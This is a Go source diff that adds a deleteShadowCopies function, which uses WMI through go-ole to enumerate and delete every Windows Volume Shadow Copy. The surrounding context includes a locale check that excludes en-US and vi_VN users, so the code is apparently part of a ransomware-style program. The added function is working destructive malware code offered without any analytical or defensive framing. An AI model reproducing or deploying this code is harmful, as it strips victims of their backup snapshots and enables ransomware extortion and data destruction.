@@ -9,6 +9,8 @@ import (
 	"syscall"
 	"time"
 
+	"github.com/go-ole/go-ole"
+	"github.com/go-ole/go-ole/oleutil"
 	"github.com/jaypipes/ghw"
 	"github.com/jeandeaual/go-locale"
 )
@@ -101,4 +103,64 @@ func languageCheck() (bool, error) {
 	}
 
 	return userLocale != "en-US" && userLocale != "vi_VN", nil
+}
+
+// Deleting Shadow Copies
+func deleteShadowCopies() error {
+	ole.CoInitialize(0)
+	defer ole.CoUninitialize()
+
+	pSWbemLocator, err := oleutil.CreateObject("WbemScripting.SWbemLocator")
+	if err != nil {
+		return err
+	}
+	defer pSWbemLocator.Release()
+
+	wmi, err := pSWbemLocator.QueryInterface(ole.IID_IDispatch)
+	if err != nil {
+		return err
+	}
+	defer wmi.Release()
+
+	// service is a SWbemServices
+	serviceRaw, err := oleutil.CallMethod(wmi, "ConnectServer", nil, "ROOT\\CIMV2")
+	if err != nil {
+		return err
+	}
+	service := serviceRaw.ToIDispatch()
+	defer service.Release()
+
+	// result is a SShadowCopy
+	resultRaw, err := oleutil.CallMethod(service, "ExecQuery", "SELECT * FROM Win32_ShadowCopy")
+	if err != nil {
+		return err
+	}
+	result := resultRaw.ToIDispatch()
+	defer result.Release()
+
+	countVar, err := oleutil.GetProperty(result, "Count")
+	if err != nil {
+		return err
+	}
+	count := int(countVar.Val)
+	for i := 0; i < count; i++ {
+		// item is a SWbemObject, but really a Win32_Process
+		itemRaw, err := oleutil.CallMethod(result, "ItemIndex", i)
+		if err != nil {
+			return err
+		}
+		item := itemRaw.ToIDispatch()
+		defer item.Release()
+
+		shadowcopy_ID, err := oleutil.GetProperty(item, "ID")
+		if err != nil {
+			return err
+		}
+		_, err = oleutil.CallMethod(service, "DeleteInstance", shadowcopy_ID.ToString(), 0, 0, 0)
+		if err != nil {
+			fmt.Println("delete instance fails")
+			return err
+		}
+	}
+	return nil
 }
